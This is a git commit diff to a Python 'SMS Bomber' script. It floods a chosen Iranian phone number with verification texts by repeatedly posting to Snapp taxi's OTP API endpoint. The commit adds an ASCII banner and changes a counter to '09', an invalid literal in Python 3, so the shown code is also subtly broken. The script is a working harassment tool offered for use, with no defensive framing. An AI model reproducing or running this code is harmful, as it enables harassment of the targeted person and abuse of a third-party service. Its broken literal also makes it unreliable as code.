fa71762abdbb7e4124c065b2f268700d8a2e00f3
inalireza <70866306+inalireza@users.noreply.github.com>
2020-12-25 00:02:05 +0330

    Update StartSendSms.py

--- StartSendSms.py
+++ StartSendSms.py
@@ -1,13 +1,38 @@
 from tqdm import tqdm
 import requests
+print("""
 
-phoneNumber = input("Enter phone number: ")
+/***
+ *                                                     _    _             
+ *                                                    | |  (_)            
+ *     _ __   ___ _ ____   _____ ______ _ __ __ _  ___| | ___ _ __   __ _ 
+ *    | '_ \ / _ \ '__\ \ / / _ \______| '__/ _` |/ __| |/ / | '_ \ / _` |
+ *    | | | |  __/ |   \ V /  __/      | | | (_| | (__|   <| | | | | (_| |
+ *    |_| |_|\___|_|    \_/ \___|      |_|  \__,_|\___|_|\_\_|_| |_|\__, |
+ *                                                                   __/ |
+ *                                                                  |___/ 
+ */
+
+
+
+/***
+ *    ____ _  _ ____    ___  ____ _  _ ___  ____ ____    _ ____ ____ _  _ _ 
+ *    [__  |\/| [__     |__] |  | |\/| |__] |___ |__/    | |__/ |__| |\ | | 
+ *    ___] |  | ___]    |__] |__| |  | |__] |___ |  \    | |  \ |  | | \| | 
+ *                                                                          
+ */
+
+       
+ 
+""")
+
+phoneNumber = input("Enter phone number +98 :  ")
 phoneNumber = str(phoneNumber)
 mydata = {"cellphone": "+98" + phoneNumber}
 urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
 numofmsgs = int(input("Enter number of messages to send: "))
 successspamCount = 0
-failspamCount = 0
+failspamCount = 09
 for i in tqdm(range(numofmsgs)):
     resp = requests.post(urlsend, data=mydata)
     if resp.status_code == 200:
